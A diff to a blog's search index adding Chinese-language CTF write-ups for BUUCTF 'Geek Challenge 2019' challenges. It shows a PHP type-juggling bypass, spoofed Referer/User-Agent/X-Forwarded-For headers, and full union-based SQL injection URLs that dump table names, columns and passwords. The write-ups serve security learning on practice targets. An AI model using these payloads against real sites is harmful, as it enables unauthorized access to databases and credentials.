@@ -1,6 +1,86 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BUUCTF-极客大挑战2019 BuyFlag</title>
+    <url>/2020/02/06/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/</url>
+    <content><![CDATA[<h1 id="极客大挑战2019-BuyFlag"><a href="#极客大挑战2019-BuyFlag" class="headerlink" title="极客大挑战2019 BuyFlag"></a>极客大挑战2019 BuyFlag</h1><p>打开playing </p>
+<p>得到提示 Only Cuit’s students can buy the FLAG</p>
+<p>先把user改了1<br><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019BuyFlag/0.png" alt="avatar"></p>
+<p>又根据下面的代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">	$password = $_POST[&apos;password&apos;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&apos;t be number&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password == 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要POST请求  更改请求 根据代码得知是弱口令<br>所以传参:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password=404%20</span><br></pre></td></tr></table></figure>
+<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019BuyFlag/1.png" alt="avatar"></p>
+<p>又得到提示 要买flag<br>本来想用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password=404%20&amp;money=100000000</span><br></pre></td></tr></table></figure>
+<p>但是发现超出了长度</p>
+<p>所以猜测使用了strcmp</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password=404%20&amp;money[]=1</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+]]></content>
+      <categories>
+        <category>WP</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUUCTF-极客大挑战2019 Http</title>
+    <url>/2020/02/06/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/</url>
+    <content><![CDATA[<h1 id="极客大挑战2019-Http"><a href="#极客大挑战2019-Http" class="headerlink" title="极客大挑战2019 Http"></a>极客大挑战2019 Http</h1><p>打开之后 查看一下源码  查看文件Secret.php</p>
+<p>访问一下<br><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/0.png" alt="avatar"></p>
+<p>抓一下包<br>添加</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Referer: https://www.Sycsecret.com</span><br></pre></td></tr></table></figure>
+
+<p>得到提示<br><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/1.png" alt="avatar"></p>
+<p>再添加</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-Agent:Syclover</span><br></pre></td></tr></table></figure>
+<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/2.png" alt="avatar"></p>
+<p>要求本地访问<br>再添加</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+]]></content>
+      <categories>
+        <category>WP</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUUCTF-极客大挑战 2019LoveSQL</title>
+    <url>/2020/02/06/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019LoveSQL/</url>
+    <content><![CDATA[<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="极客大挑战 2019 LoveSQL"></a>极客大挑战 2019 LoveSQL</h1><p>打开题目  先用万能密码登录试试</p>
+<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/0.png" alt="avatar"></p>
+<p>用order by试试字段</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://3a2fed05-d0ad-42fe-9dbd-898c38712309.node3.buuoj.cn/check.php?username=1%27%20order%20by%204%20%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/1.png" alt="avatar"></p>
+<p>得知有3个字段  接下来就是常规的注入了</p>
+<p>爆表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://3a2fed05-d0ad-42fe-9dbd-898c38712309.node3.buuoj.cn/check.php?username=1%27%20union%20select%201%2C2%2Cgroup_concat%28table_name%29%20from%20information_schema.tables%20where%20table_schema%3D%20database%28%29%20%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/2.png" alt="avatar"></p>
+<p>查一下表 l0ve1ysq1</p>
+<p>爆字段</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://3a2fed05-d0ad-42fe-9dbd-898c38712309.node3.buuoj.cn/check.php?username=1%27%20union%20select%201%2C2%2Cgroup_concat%28column_name%29%20from%20information_schema.columns%20where%20table_name%3D%20%27l0ve1ysq1%27%20%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<p>得到三个字段 查一下password</p>
+<p>爆数据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://3a2fed05-d0ad-42fe-9dbd-898c38712309.node3.buuoj.cn/check.php?username=1%27%20union%20select%201%2C2%2Cgroup_concat%28password%29%20from%20l0ve1ysq1%20%23&amp;password=123</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+]]></content>
+      <categories>
+        <category>WP</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUUCTF-极客大挑战 2019 Knife</title>
     <url>/2020/02/04/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife/</url>
     <content><![CDATA[<h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="极客大挑战 2019 Knife"></a>极客大挑战 2019 Knife</h1><p>根据提示<br>我家菜刀丢了，你能帮我找一下么</p>
